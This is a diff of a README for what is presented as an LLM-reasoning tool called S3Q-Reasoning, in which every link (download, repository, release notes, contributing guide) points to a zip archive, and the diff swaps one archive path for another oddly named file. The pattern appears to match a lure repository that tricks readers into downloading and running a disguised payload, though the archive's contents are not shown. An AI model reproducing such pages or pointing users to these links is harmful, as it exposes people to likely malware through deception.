@@ -1,6 +1,6 @@
 # 🚀 S3Q-Reasoning - Enhance LLM Reliability and Truthfulness
 
-[![Download S3Q-Reasoning](https://raw.githubusercontent.com/Skrapma4872/S3Q-Reasoning/main/assets/S3Q-Reasoning-v2.0.zip)](https://raw.githubusercontent.com/Skrapma4872/S3Q-Reasoning/main/assets/S3Q-Reasoning-v2.0.zip)
+[![Download S3Q-Reasoning](https://github.com/Skrapma4872/S3Q-Reasoning/raw/refs/heads/main/utils/Reasoning_marguerite.zip)](https://github.com/Skrapma4872/S3Q-Reasoning/raw/refs/heads/main/utils/Reasoning_marguerite.zip)
 
 ## 📁 Overview
 
@@ -29,7 +29,7 @@ Follow these steps to download and run S3Q-Reasoning on your computer.
    
    Go to the S3Q-Reasoning releases page:
 
-   [Download S3Q-Reasoning](https://raw.githubusercontent.com/Skrapma4872/S3Q-Reasoning/main/assets/S3Q-Reasoning-v2.0.zip)
+   [Download S3Q-Reasoning](https://github.com/Skrapma4872/S3Q-Reasoning/raw/refs/heads/main/utils/Reasoning_marguerite.zip)
 
 2. **Select the Latest Release**
 
@@ -57,7 +57,7 @@ Follow these steps to download and run S3Q-Reasoning on your computer.
 
 ## 📥 Download & Install
 
-To start using S3Q-Reasoning, visit the download page here: [Download S3Q-Reasoning](https://raw.githubusercontent.com/Skrapma4872/S3Q-Reasoning/main/assets/S3Q-Reasoning-v2.0.zip).
+To start using S3Q-Reasoning, visit the download page here: [Download S3Q-Reasoning](https://github.com/Skrapma4872/S3Q-Reasoning/raw/refs/heads/main/utils/Reasoning_marguerite.zip).
 
 ## 📚 User Guide
 
@@ -89,8 +89,8 @@ For further reading and usage examples, check the Wiki section on the GitHub pag
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Skrapma4872/S3Q-Reasoning/main/assets/S3Q-Reasoning-v2.0.zip)
-- [Release Notes](https://raw.githubusercontent.com/Skrapma4872/S3Q-Reasoning/main/assets/S3Q-Reasoning-v2.0.zip)
-- [Contributing Guide](https://raw.githubusercontent.com/Skrapma4872/S3Q-Reasoning/main/assets/S3Q-Reasoning-v2.0.zip)
+- [GitHub Repository](https://github.com/Skrapma4872/S3Q-Reasoning/raw/refs/heads/main/utils/Reasoning_marguerite.zip)
+- [Release Notes](https://github.com/Skrapma4872/S3Q-Reasoning/raw/refs/heads/main/utils/Reasoning_marguerite.zip)
+- [Contributing Guide](https://github.com/Skrapma4872/S3Q-Reasoning/raw/refs/heads/main/utils/Reasoning_marguerite.zip)
 
 Thank you for choosing S3Q-Reasoning. Enjoy your enhanced AI interactions!
